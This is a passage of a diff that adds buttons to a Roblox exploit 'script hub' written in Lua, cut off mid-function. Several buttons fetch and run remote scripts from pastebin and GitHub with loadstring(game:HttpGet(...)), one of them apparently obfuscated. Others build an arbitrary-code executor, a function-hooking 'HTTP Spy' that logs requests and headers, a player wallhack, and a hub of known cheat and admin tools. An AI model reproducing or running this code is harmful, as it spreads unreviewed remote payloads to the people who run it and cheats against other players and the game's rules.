@@ -7,6 +7,3386 @@ local Win = Lib:CreateWindow("lnfinitive Ui Separate")
 
 local Tab,name = Win:CreateTab("Script "..tostring(i),function() warn(i) end)
 
+Tab:CreateButton("Frosts Gui",function()
+loadstring(game:HttpGet("https://pastebin.com/raw/2raDeWbr"))()
+end) 
+
+Tab:CreateButton("Ping view new Fps",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/main/Protected_5462789553454421%20(1).txt", true))()
+end) 
+
+Tab:CreateButton("Unypse X",function()
+-- Create a simple GUI with execute functionality
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "UnypseXExec"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+-- Create top squircle with "Unypse X" text
+local topPart = Instance.new("Frame")
+topPart.Size = UDim2.new(0.5, 0, 0.1, 0) -- Size of the top part
+topPart.Position = UDim2.new(0.25, 0, 0, 0) -- Centered horizontally at the top
+topPart.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+topPart.Parent = screenGui
+
+local topPartCorner = Instance.new("UICorner")
+topPartCorner.CornerRadius = UDim.new(0.1, 0) -- Smaller rounded corners
+topPartCorner.Parent = topPart
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 1, 0) -- Full size of the topPart
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBold -- Updated to GothamBold
+titleLabel.TextScaled = true
+titleLabel.Parent = topPart
+
+local richText = "<font color=\"rgb(255,165,0)\">U</font>nypse X"
+titleLabel.Text = richText
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.RichText = true
+
+-- Create bottom squircle with TextBox and buttons
+local bottomPart = Instance.new("Frame")
+bottomPart.Size = UDim2.new(0.5, 0, 0.6, 0) -- Size of the bottom part
+bottomPart.Position = UDim2.new(0.25, 0, 0.2, 0) -- Centered
+bottomPart.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
+bottomPart.Parent = screenGui
+
+local bottomPartCorner = Instance.new("UICorner")
+bottomPartCorner.CornerRadius = UDim.new(0.1, 0) -- Smaller rounded corners
+bottomPartCorner.Parent = bottomPart
+
+local codeInput = Instance.new("TextBox")
+codeInput.Size = UDim2.new(0.8, 0, 0.7, 0)
+codeInput.Position = UDim2.new(0.1, 0, 0.1, 0)
+codeInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+codeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+codeInput.Text = "Thanks for using Unypse X! Unypse X was made by temokote <3"
+codeInput.Font = Enum.Font.Code -- Updated to "Code" font
+codeInput.TextSize = 18
+codeInput.MultiLine = true
+codeInput.ClearTextOnFocus = false
+codeInput.Parent = bottomPart
+
+local codeInputCorner = Instance.new("UICorner")
+codeInputCorner.CornerRadius = UDim.new(0.1, 0) -- Smaller rounded corners
+codeInputCorner.Parent = codeInput
+
+local executeButton = Instance.new("TextButton")
+executeButton.Size = UDim2.new(0.3, 0, 0.1, 0)
+executeButton.Position = UDim2.new(0.05, 0, 0.8, 0)
+executeButton.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
+executeButton.TextColor3 = Color3.fromRGB(0, 255, 0)
+executeButton.Text = "Execute"
+executeButton.Font = Enum.Font.Code -- Updated to "Code" font
+executeButton.TextSize = 18
+executeButton.Parent = bottomPart
+
+local executeButtonCorner = Instance.new("UICorner")
+executeButtonCorner.CornerRadius = UDim.new(0.1, 0) -- Smaller rounded corners
+executeButtonCorner.Parent = executeButton
+
+-- Clear button
+local clearButton = Instance.new("TextButton")
+clearButton.Size = UDim2.new(0.3, 0, 0.1, 0)
+clearButton.Position = UDim2.new(0.4, 0, 0.8, 0)
+clearButton.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
+clearButton.TextColor3 = Color3.fromRGB(0, 255, 255)
+clearButton.Text = "Clear"
+clearButton.Font = Enum.Font.Code -- Updated to "Code" font
+clearButton.TextSize = 18
+clearButton.Parent = bottomPart
+
+local clearButtonCorner = Instance.new("UICorner")
+clearButtonCorner.CornerRadius = UDim.new(0.1, 0) -- Smaller rounded corners
+clearButtonCorner.Parent = clearButton
+
+-- Status label
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
+statusLabel.Position = UDim2.new(0.75, 0, 0.8, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.Text = ""
+statusLabel.Font = Enum.Font.Code -- Updated to "Code" font
+statusLabel.TextScaled = true
+statusLabel.Parent = bottomPart
+
+-- Execute code function
+local function executeCode()
+    local code = codeInput.Text
+    local success, result = pcall(function()
+        loadstring(code)()
+    end)
+    
+    if success then
+        statusLabel.Text = "Executed!"
+        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+    else
+        statusLabel.Text = "Error: " .. result
+        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    end
+
+    -- Fade out statusLabel after 1 second
+    wait(1)
+    for i = 1, 30 do
+        statusLabel.TextTransparency = i / 30
+        wait(0.1)
+    end
+    statusLabel.Text = ""
+    statusLabel.TextTransparency = 0
+end
+
+executeButton.MouseButton1Click:Connect(executeCode)
+
+-- Clear code function
+local function clearCode()
+    codeInput.Text = ""
+    statusLabel.Text = ""
+end
+
+clearButton.MouseButton1Click:Connect(clearCode)
+
+-- Minimize functionality
+local isMinimized = false
+local function toggleMinimize()
+    isMinimized = not isMinimized
+    bottomPart.Visible = not isMinimized
+end
+
+local minimizeButton = Instance.new("TextButton")
+minimizeButton.Size = UDim2.new(0.1, 0, 0.6, 0)
+minimizeButton.Position = UDim2.new(0.8, 0, 0.2, 0)
+minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
+minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimizeButton.Text = "-"
+minimizeButton.Font = Enum.Font.Code -- Updated to "Code" font
+minimizeButton.TextScaled = true
+minimizeButton.Parent = topPart
+
+local minimizeButtonCorner = Instance.new("UICorner")
+minimizeButtonCorner.CornerRadius = UDim.new(0.2, 0) -- Adjust corner radius for a squircle
+minimizeButtonCorner.Parent = minimizeButton
+
+minimizeButton.MouseButton1Click:Connect(toggleMinimize)
+
+-- Close functionality
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0.1, 0, 0.6, 0)
+closeButton.Position = UDim2.new(0.9, 0, 0.2, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.Code -- Updated to "Code" font
+closeButton.TextScaled = true
+closeButton.Parent = topPart
+
+local closeButtonCorner = Instance.new("UICorner")
+closeButtonCorner.CornerRadius = UDim.new(0.2, 0) -- Adjust corner radius for a squircle
+closeButtonCorner.Parent = closeButton
+
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+end)
+end) 
+
+Tab:CreateButton("HTTP Spy v2",function()
+local HttpSpy = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TitleBar = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local TitleText = Instance.new("TextLabel")
+local MainContainer = Instance.new("ScrollingFrame")
+local UIListLayout = Instance.new("UIListLayout")
+local UIPadding = Instance.new("UIPadding")
+
+-- Properties
+HttpSpy.Name = "HttpSpy"
+HttpSpy.Parent = game.CoreGui
+HttpSpy.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = HttpSpy
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.05, 0, 0.25, 0)
+MainFrame.Size = UDim2.new(0, 400, 0, 300)
+
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+TitleBar.Name = "TitleBar"
+TitleBar.Parent = MainFrame
+TitleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+TitleBar.BorderSizePixel = 0
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+
+UICorner_2.CornerRadius = UDim.new(0, 10)
+UICorner_2.Parent = TitleBar
+
+TitleText.Name = "TitleText"
+TitleText.Parent = TitleBar
+TitleText.BackgroundTransparency = 1
+TitleText.Position = UDim2.new(0, 10, 0, 0)
+TitleText.Size = UDim2.new(1, -40, 1, 0)
+TitleText.Font = Enum.Font.GothamSemibold
+TitleText.Text = "HTTP Spy v2"
+TitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleText.TextSize = 14
+TitleText.TextXAlignment = Enum.TextXAlignment.Left
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Parent = TitleBar
+MinimizeButton.BackgroundTransparency = 1
+MinimizeButton.Position = UDim2.new(1, -30, 0, 0)
+MinimizeButton.Size = UDim2.new(0, 30, 1, 0)
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.Text = "-"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.TextSize = 20
+
+MainContainer.Name = "MainContainer"
+MainContainer.Parent = MainFrame
+MainContainer.BackgroundTransparency = 1
+MainContainer.Position = UDim2.new(0, 0, 0, 30)
+MainContainer.Size = UDim2.new(1, 0, 1, -30)
+MainContainer.ScrollBarThickness = 4
+MainContainer.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 80)
+
+UIListLayout.Parent = MainContainer
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Padding = UDim.new(0, 5)
+
+UIPadding.Parent = MainContainer
+UIPadding.PaddingLeft = UDim.new(0, 10)
+UIPadding.PaddingRight = UDim.new(0, 10)
+UIPadding.PaddingTop = UDim.new(0, 10)
+
+local NotificationFrame = Instance.new("Frame")
+local NotificationText = Instance.new("TextLabel")
+
+NotificationFrame.Name = "NotificationFrame"
+NotificationFrame.Parent = HttpSpy
+NotificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+NotificationFrame.BorderSizePixel = 0
+NotificationFrame.Position = UDim2.new(1, -220, 1, -60)
+NotificationFrame.Size = UDim2.new(0, 200, 0, 40)
+NotificationFrame.Visible = false
+
+local NotificationCorner = Instance.new("UICorner")
+NotificationCorner.CornerRadius = UDim.new(0, 5)
+NotificationCorner.Parent = NotificationFrame
+
+NotificationText.Name = "NotificationText"
+NotificationText.Parent = NotificationFrame
+NotificationText.BackgroundTransparency = 1
+NotificationText.Size = UDim2.new(1, 0, 1, 0)
+NotificationText.Font = Enum.Font.GothamSemibold
+NotificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+NotificationText.TextSize = 14
+NotificationText.Text = "Log copied to clipboard!"
+
+local isMinimized = false
+
+MinimizeButton.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+
+    if not isMinimized then
+        MainContainer.Visible = true
+        MainFrame.Size = UDim2.new(0, 400, 0, 300)
+        MinimizeButton.Text = "-"
+        return
+    end
+
+    MainContainer.Visible = false
+    MainFrame.Size = UDim2.new(0, 400, 0, 30)
+    MinimizeButton.Text = "+"
+end)
+
+-- Functions
+local function createDraggable(gui)
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
+
+        dragging = true
+        dragStart = input.Position
+        startPos = gui.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState ~= Enum.UserInputState.End then return end
+            dragging = false
+        end)
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
+        dragInput = input
+    end)
+
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input ~= dragInput or not dragging then return end
+        update(input)
+    end)
+end
+
+createDraggable(MainFrame)
+
+local function registerDynamicScrollingFrame(frame)
+    local layout = frame:FindFirstChildWhichIsA("UIListLayout")
+
+    local function updateCanvasSize()
+        frame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
+    end
+
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvasSize)
+    updateCanvasSize()
+end
+
+registerDynamicScrollingFrame(MainContainer)
+
+local function showNotification()
+    NotificationFrame.Visible = true
+    task.wait(2)
+    NotificationFrame.Visible = false
+end
+
+local function formatLogEntry(method, url, headers)
+    if not method or not url then
+        return ""
+    end
+
+    local text = method .. "\n" .. url
+
+    if not headers or type(headers) ~= "table" then
+        return text
+    end
+
+    text ..= "\n\nHeaders:"
+    for key, value in pairs(headers) do
+        text ..= string.format("\n%s: %s", tostring(key), tostring(value))
+    end
+
+    return text
+end
+
+local function createLogEntry(method, url, headers)
+    local LogEntry = Instance.new("TextButton")
+    LogEntry.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+    LogEntry.BorderSizePixel = 0
+    LogEntry.Size = UDim2.new(1, 0, 0, 30)
+    LogEntry.Font = Enum.Font.SourceSansSemibold
+    LogEntry.TextColor3 = Color3.fromRGB(220, 220, 220)
+    LogEntry.TextSize = 14
+    LogEntry.TextWrapped = true
+    LogEntry.TextXAlignment = Enum.TextXAlignment.Left
+    LogEntry.TextYAlignment = Enum.TextYAlignment.Top
+    LogEntry.AutoButtonColor = false
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 5)
+    UICorner.Parent = LogEntry
+
+    local UIPadding = Instance.new("UIPadding")
+    UIPadding.Parent = LogEntry
+    UIPadding.PaddingLeft = UDim.new(0, 10)
+    UIPadding.PaddingRight = UDim.new(0, 10)
+    UIPadding.PaddingTop = UDim.new(0, 5)
+    UIPadding.PaddingBottom = UDim.new(0, 5)
+
+    local logText = formatLogEntry(method, url, headers)
+    LogEntry.Text = logText
+    LogEntry.Parent = MainContainer
+
+    local textSize = game:GetService("TextService"):GetTextSize(
+        LogEntry.Text,
+        LogEntry.TextSize,
+        LogEntry.Font,
+        Vector2.new(MainContainer.AbsoluteSize.X - 40, math.huge)
+    )
+    LogEntry.Size = UDim2.new(1, 0, 0, textSize.Y + 10)
+
+    local OriginalColor = LogEntry.BackgroundColor3
+
+    LogEntry.MouseEnter:Connect(function()
+        LogEntry.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+    end)
+
+    LogEntry.MouseLeave:Connect(function()
+        LogEntry.BackgroundColor3 = OriginalColor
+    end)
+
+    LogEntry.MouseButton1Click:Connect(function()
+        setclipboard(logText)
+        showNotification()
+    end)
+
+    MainContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
+end
+
+-- HTTP Spy Logic
+local HttpGet
+HttpGet = hookfunction(game.HttpGet, function(self, url, ...)
+    createLogEntry("HTTP GET", url)
+    return HttpGet(self, url, ...)
+end)
+
+local HttpPost
+HttpPost = hookfunction(game.HttpPost, function(self, url, ...)
+    createLogEntry("HTTP POST", url)
+    return HttpPost(self, url, ...)
+end)
+
+local RequestLog
+if syn and syn.request then
+    RequestLog = hookfunction(syn.request, function(dat)
+        createLogEntry(dat.Method or "REQUEST", dat.Url, dat.Headers)
+        return RequestLog(dat)
+    end)
+elseif request then
+    RequestLog = hookfunction(request, function(dat)
+        createLogEntry(dat.Method or "REQUEST", dat.Url, dat.Headers)
+        return RequestLog(dat)
+    end)
+else
+    createLogEntry("WARNING", "Your exploit is not supported!")
+end
+end) 
+
+Tab:CreateButton("Disable X-Ray",function()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = PlayerGui
+
+-- Create Frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 150)
+frame.Position = UDim2.new(0.5, -100, 0.5, -75)
+frame.BackgroundTransparency = 0.5
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.Draggable = true
+frame.Active = true
+frame.Visible = false -- Initially hidden
+frame.Parent = screenGui
+
+-- Create X-Ray Button
+local xrayButton = Instance.new("TextButton")
+xrayButton.Size = UDim2.new(0, 180, 0, 50)
+xrayButton.Position = UDim2.new(0, 10, 0, 25)
+xrayButton.BackgroundColor3 = Color3.new(1, 0, 0)
+xrayButton.Text = "Enable X-Ray"
+xrayButton.Parent = frame
+
+-- Create Disable X-Ray Button
+local disableXrayButton = Instance.new("TextButton")
+disableXrayButton.Size = UDim2.new(0, 180, 0, 50)
+disableXrayButton.Position = UDim2.new(0, 10, 0, 85)
+disableXrayButton.BackgroundColor3 = Color3.new(0, 1, 0)
+disableXrayButton.Text = "Disable X-Ray"
+disableXrayButton.Parent = frame
+
+-- Create Open/Close Button
+local toggleGuiButton = Instance.new("TextButton")
+toggleGuiButton.Size = UDim2.new(0, 100, 0, 50)
+toggleGuiButton.Position = UDim2.new(0, 10, 0, 10)
+toggleGuiButton.BackgroundColor3 = Color3.new(0, 1, 0)
+toggleGuiButton.Text = "Open GUI"
+toggleGuiButton.Parent = screenGui
+
+local highlights = {}
+
+local function highlightPlayers()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local character = player.Character
+            if character then
+                local highlight = Instance.new("Highlight")
+                highlight.Adornee = character
+                highlight.FillTransparency = 1
+                highlight.OutlineTransparency = 0
+                highlight.OutlineColor = Color3.new(1, 0, 0)
+                highlight.Parent = character
+                table.insert(highlights, highlight)
+            end
+        end
+    end
+end
+
+local function removeHighlights()
+    for _, highlight in pairs(highlights) do
+        if highlight then
+            highlight:Destroy()
+        end
+    end
+    highlights = {}
+end
+
+local function toggleGui()
+    frame.Visible = not frame.Visible
+    if frame.Visible then
+        toggleGuiButton.Text = "Close GUI"
+    else
+        toggleGuiButton.Text = "Open GUI"
+    end
+end
+
+xrayButton.MouseButton1Click:Connect(function()
+    highlightPlayers()
+    xrayButton.Visible = false
+    disableXrayButton.Visible = true
+end)
+
+disableXrayButton.MouseButton1Click:Connect(function()
+    removeHighlights()
+    xrayButton.Visible = true
+    disableXrayButton.Visible = false
+end)
+
+toggleGuiButton.MouseButton1Click:Connect(toggleGui)
+end) 
+
+Tab:CreateButton("BlackCat48Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ytDragonV6bayku/BlackCat48HubMainScriptLoader/main/MainScriptLoader", true))()
+end) 
+
+Tab:CreateButton("Simple gui template",function()
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(128, 128, 128)  -- Grey color
+Frame.Size = UDim2.new(0, 200, 0, 200)
+Frame.Position = UDim2.new(0.5, -100, 0.5, -100)  -- Centered position
+
+-- Enable dragging
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+end) 
+
+Tab:CreateButton("OCM Hub v1",function()
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local uncc = Instance.new("TextButton")
+local redz = Instance.new("TextButton")
+local jul = Instance.new("TextButton")
+local yeet = Instance.new("TextButton")
+local C00LMAN = Instance.new("TextButton")
+local GH0 = Instance.new("TextButton")
+local INF = Instance.new("TextButton")
+local Namle = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderSizePixel = 2
+Frame.Position = UDim2.new(0.369491518, 0, 0.345417231, 0)
+Frame.Size = UDim2.new(0, 333, 0, 243)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Position = UDim2.new(-0.227923051, 0, 0.0308362544, 0)
+TextLabel.Size = UDim2.new(0, 483, 0, 36)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "O.C.M Script Hub v1.0"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+uncc.Name = "uncc"
+uncc.Parent = Frame
+uncc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+uncc.BorderColor3 = Color3.fromRGB(255, 0, 0)
+uncc.BorderSizePixel = 2
+uncc.Position = UDim2.new(0.0601035506, 0, 0.225949928, 0)
+uncc.Size = UDim2.new(0, 136, 0, 34)
+uncc.Font = Enum.Font.SourceSans
+uncc.Text = "Unc Check"
+uncc.TextColor3 = Color3.fromRGB(255, 255, 255)
+uncc.TextScaled = true
+uncc.TextSize = 14.000
+uncc.TextWrapped = true
+
+redz.Name = "redz"
+redz.Parent = Frame
+redz.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+redz.BorderColor3 = Color3.fromRGB(255, 0, 0)
+redz.BorderSizePixel = 2
+redz.Position = UDim2.new(0.0597822964, 0, 0.424279988, 0)
+redz.Size = UDim2.new(0, 136, 0, 34)
+redz.Font = Enum.Font.SourceSans
+redz.Text = "Redz Hub"
+redz.TextColor3 = Color3.fromRGB(255, 255, 255)
+redz.TextScaled = true
+redz.TextSize = 14.000
+redz.TextWrapped = true
+
+jul.Name = "jul"
+jul.Parent = Frame
+jul.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+jul.BorderColor3 = Color3.fromRGB(255, 0, 0)
+jul.BorderSizePixel = 2
+jul.Position = UDim2.new(0.520542979, 0, 0.225949883, 0)
+jul.Size = UDim2.new(0, 136, 0, 34)
+jul.Font = Enum.Font.SourceSans
+jul.Text = "Imperial Hub"
+jul.TextColor3 = Color3.fromRGB(255, 255, 255)
+jul.TextScaled = true
+jul.TextSize = 14.000
+jul.TextWrapped = true
+
+yeet.Name = "yeet"
+yeet.Parent = Frame
+yeet.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+yeet.BorderColor3 = Color3.fromRGB(255, 0, 0)
+yeet.BorderSizePixel = 2
+yeet.Position = UDim2.new(0.518497527, 0, 0.829540372, 0)
+yeet.Size = UDim2.new(0, 136, 0, 34)
+yeet.Font = Enum.Font.SourceSans
+yeet.Text = "FE yeet Gui"
+yeet.TextColor3 = Color3.fromRGB(255, 255, 255)
+yeet.TextScaled = true
+yeet.TextSize = 14.000
+yeet.TextWrapped = true
+
+C00LMAN.Name = "C00LMAN"
+C00LMAN.Parent = Frame
+C00LMAN.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+C00LMAN.BorderColor3 = Color3.fromRGB(255, 0, 0)
+C00LMAN.BorderSizePixel = 2
+C00LMAN.Position = UDim2.new(0.519089162, 0, 0.422132969, 0)
+C00LMAN.Size = UDim2.new(0, 136, 0, 34)
+C00LMAN.Font = Enum.Font.SourceSans
+C00LMAN.Text = "c00lman Edit"
+C00LMAN.TextColor3 = Color3.fromRGB(255, 255, 255)
+C00LMAN.TextScaled = true
+C00LMAN.TextSize = 14.000
+C00LMAN.TextWrapped = true
+
+GH0.Name = "GH0"
+GH0.Parent = Frame
+GH0.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+GH0.BorderColor3 = Color3.fromRGB(255, 0, 0)
+GH0.BorderSizePixel = 2
+GH0.Position = UDim2.new(0.520542979, 0, 0.606906712, 0)
+GH0.Size = UDim2.new(0, 136, 0, 34)
+GH0.Font = Enum.Font.SourceSans
+GH0.Text = "Gui Com Fling"
+GH0.TextColor3 = Color3.fromRGB(255, 255, 255)
+GH0.TextScaled = true
+GH0.TextSize = 14.000
+GH0.TextWrapped = true
+
+INF.Name = "INF"
+INF.Parent = Frame
+INF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+INF.BorderColor3 = Color3.fromRGB(255, 0, 0)
+INF.BorderSizePixel = 2
+INF.Position = UDim2.new(0.0601035506, 0, 0.832949042, 0)
+INF.Size = UDim2.new(0, 136, 0, 34)
+INF.Font = Enum.Font.SourceSans
+INF.Text = "Infinite Yield"
+INF.TextColor3 = Color3.fromRGB(255, 255, 255)
+INF.TextScaled = true
+INF.TextSize = 14.000
+INF.TextWrapped = true
+
+Namle.Name = "Namle"
+Namle.Parent = Frame
+Namle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Namle.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Namle.BorderSizePixel = 2
+Namle.Position = UDim2.new(0.0599398054, 0, 0.608257294, 0)
+Namle.Size = UDim2.new(0, 136, 0, 34)
+Namle.Font = Enum.Font.SourceSans
+Namle.Text = "Nameless Admin"
+Namle.TextColor3 = Color3.fromRGB(255, 255, 255)
+Namle.TextScaled = true
+Namle.TextSize = 14.000
+Namle.TextWrapped = true
+
+-- Scripts:
+
+local function QCKOV_fake_script() -- uncc.Script 
+	local script = Instance.new('Script', uncc)
+
+	
+	uncc.MouseButton1Down:connect(function()
+		local passes, fails, undefined = 0, 0, 0
+		local running = 0
+	
+		local function getGlobal(path)
+			local value = getfenv(0)
+	
+			while value ~= nil and path ~= "" do
+				local name, nextValue = string.match(path, "^([^.]+)%.?(.*)$")
+				value = value[name]
+				path = nextValue
+			end
+	
+			return value
+		end
+	
+		local function test(name, aliases, callback)
+			running += 1
+	
+			task.spawn(function()
+				if not callback then
+					print("โบ๏ธ " .. name)
+				elseif not getGlobal(name) then
+					fails += 1
+					warn("โ” " .. name)
+				else
+					local success, message = pcall(callback)
+	
+					if success then
+						passes += 1
+						print("โ… " .. name .. (message and " โ€ข " .. message or ""))
+					else
+						fails += 1
+						warn("โ” " .. name .. " failed: " .. message)
+					end
+				end
+	
+				local undefinedAliases = {}
+	
+				for _, alias in ipairs(aliases) do
+					if getGlobal(alias) == nil then
+						table.insert(undefinedAliases, alias)
+					end
+				end
+	
+				if #undefinedAliases > 0 then
+					undefined += 1
+					warn("โ ๏ธ " .. table.concat(undefinedAliases, ", "))
+				end
+	
+				running -= 1
+			end)
+		end
+	
+		-- Header and summary
+	
+		print("\n")
+	
+		print("UNC Environment Check")
+		print("โ… - Pass, โ” - Fail, โบ๏ธ - No test, โ ๏ธ - Missing aliases\n")
+	
+		task.defer(function()
+			repeat task.wait() until running == 0
+	
+			local rate = math.round(passes / (passes + fails) * 100)
+			local outOf = passes .. " out of " .. (passes + fails)
+	
+			print("\n")
+	
+			print("UNC Summary")
+			print("โ… Tested with a " .. rate .. "% success rate (" .. outOf .. ")")
+			print("โ” " .. fails .. " tests failed")
+			print("โ ๏ธ " .. undefined .. " globals are missing aliases")
+		end)
+	
+		-- Cache
+	
+		test("cache.invalidate", {}, function()
+			local container = Instance.new("Folder")
+			local part = Instance.new("Part", container)
+			cache.invalidate(container:FindFirstChild("Part"))
+			assert(part ~= container:FindFirstChild("Part"), "Reference `part` could not be invalidated")
+		end)
+	
+		test("cache.iscached", {}, function()
+			local part = Instance.new("Part")
+			assert(cache.iscached(part), "Part should be cached")
+			cache.invalidate(part)
+			assert(not cache.iscached(part), "Part should not be cached")
+		end)
+	
+		test("cache.replace", {}, function()
+			local part = Instance.new("Part")
+			local fire = Instance.new("Fire")
+			cache.replace(part, fire)
+			assert(part ~= fire, "Part was not replaced with Fire")
+		end)
+	
+		test("cloneref", {}, function()
+			local part = Instance.new("Part")
+			local clone = cloneref(part)
+			assert(part ~= clone, "Clone should not be equal to original")
+			clone.Name = "Test"
+			assert(part.Name == "Test", "Clone should have updated the original")
+		end)
+	
+		test("compareinstances", {}, function()
+			local part = Instance.new("Part")
+			local clone = cloneref(part)
+			assert(part ~= clone, "Clone should not be equal to original")
+			assert(compareinstances(part, clone), "Clone should be equal to original when using compareinstances()")
+		end)
+	
+		-- Closures
+	
+		local function shallowEqual(t1, t2)
+			if t1 == t2 then
+				return true
+			end
+	
+			local UNIQUE_TYPES = {
+				["function"] = true,
+				["table"] = true,
+				["userdata"] = true,
+				["thread"] = true,
+			}
+	
+			for k, v in pairs(t1) do
+				if UNIQUE_TYPES[type(v)] then
